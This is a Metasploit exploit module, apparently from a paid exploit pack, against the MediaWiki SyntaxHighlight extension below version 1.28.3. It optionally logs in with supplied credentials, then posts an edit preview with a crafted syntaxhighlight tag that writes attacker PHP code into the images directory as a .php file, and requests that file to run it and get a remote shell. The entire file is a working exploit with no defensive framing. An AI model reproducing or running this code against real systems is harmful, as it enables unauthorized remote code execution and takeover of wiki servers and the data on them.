##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'MediaWiki SyntaxHighlight Remote Code Execution',
      'Description' => %q{
    This module exploits vulnerable instances in order to gain a remote shell.

    MediaWiki is a popular open-source wiki and collaboration server. In versions
    below 1.28.3, a vulnerable SyntaxHighlighter plugin was shipped, though not
    enabled by default. This enables an attacker to potentially write a file to
    the web root with arbitrary PHP code.

    Categories: Open Source

    Price: 7

    Video: https://asciinema.org/a/d7hxzjdizhatczdvqakuvtrc4

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'Author' =>
        [
        ],
      'License' => 'VolatileMinds',
      'References' =>
        [
          ['URL', 'https://www.securify.nl/advisory/SFY20170201/syntaxhighlight_mediawiki_extension_allows_injection_of_arbitrary_pygments_options.html']
        ],
      'Privileged' => false,
      'Platform'   => ['php'],
      'Arch'       => ARCH_PHP,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => ''))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base MediaWiki directory path", '/']),
        OptBool.new('AUTHENTICATE', [true, "Attempt to authenticate before exploiting", false]),
        OptString.new('USERNAME', [false, "The username to authenticate with", "username"]),
        OptString.new('PASSWORD', [false, "The password to authenticate with", "password"])
      ], self.class)
  end

  def exploit
    cookie = nil
    if datastore['AUTHENTICATE']

      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'index.php?title=Special:UserLogin'),
      })

      cookie = res.get_cookies
      login_token = $1 if res && res.body =~ /<input name="wpLoginToken" type="hidden" value="(.*?)"\/>/

      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'index.php?title=Special:UserLogin'),
        'method' => 'POST',
        'vars_post' => {
          'wpName' => datastore['USERNAME'],
          'wpPassword' => datastore['PASSWORD'],
          'wploginattempt' => 'Log in',
          'wpEditToken' => "\x2b\x5c",
          'title' => 'Special:UserLogin',
          'authAction' => 'login',
          'force' => '',
          'wpLoginToken' => login_token
        },
        'cookie' => cookie
      })

      if res.code != 302
        fail_with(Failure::Unknown, 'Authentication failed')
      end

      cookie = res.get_cookies
    end

    title = Rex::Text.rand_text_alpha(10)

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php?title='+title+'&action=edit'),
      'cookie' => cookie
    })

    autosummary = $1 if res && res.body =~ /<input type="hidden" value="(.*?)" name="wpAutoSummary"\/>/
    edittoken = $1 if res && res.body =~ /<input type="hidden" value="(.*?)" name="wpEditToken"\/>/

    filename = Rex::Text.rand_text_alpha(8) + '.php'
    res_opts = {}

    data = Rex::MIME::Message.new
    data.add_part('', nil, nil, 'form-data; name="wpAntispam"')
    data.add_part('', nil, nil, 'form-data; name="wpSection"')
    data.add_part('20170501090002', nil, nil, 'form-data; name="wpStarttime"')
    data.add_part('20170501080625', nil, nil, 'form-data; name="wpEdittime"')
    data.add_part('1', nil, nil, 'form-data; name="editRevId"')
    data.add_part('0', nil, nil, 'form-data; name="wpScrolltop"')
    data.add_part(autosummary, nil, nil, 'form-data; name="wpAutoSummary"')
    data.add_part('0', nil, nil, 'form-data; name="oldid"')
    data.add_part('1', nil, nil, 'form-data; name="parentRevId"')
    data.add_part('text/x-wiki', nil, nil, 'form-data; name="format"')
    data.add_part('wikitext', nil, nil, 'form-data; name="model"')
    data.add_part(%Q{<syntaxhighlight lang='java' start='0,full=1,title=,cssfile=images/#{filename},classprefix=&lt;?php #{payload.encoded}exit; ?&gt;'></syntaxhighlight>}, nil, nil, 'form-data; name="wpTextbox1"')
    data.add_part('', nil, nil, 'form-data; name="wpSummary"')
    data.add_part('1', nil, nil, 'form-data; name="wpWatchthis"')
    data.add_part('Show preview', nil, nil, 'form-data; name="wpPreview"')
    data.add_part(edittoken, nil, nil, 'form-data; name="wpEditToken"')
    data.add_part('text', nil, nil, 'form-data; name="mode"')
    data.add_part('1', nil, nil, 'form-data; name="wpUltimateParam"')

    res_opts['uri'] = normalize_uri(target_uri.path, 'index.php?title='+title+'&action=submit')
    res_opts['method'] = 'POST'
    res_opts['data'] = data.to_s
    res_opts['ctype'] = 'multipart/form-data; boundary=' + data.bound

    if cookie != nil
      res_opts['cookie'] = cookie
    end

    res = send_request_cgi(res_opts)

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'images', filename)
    })
  end
end
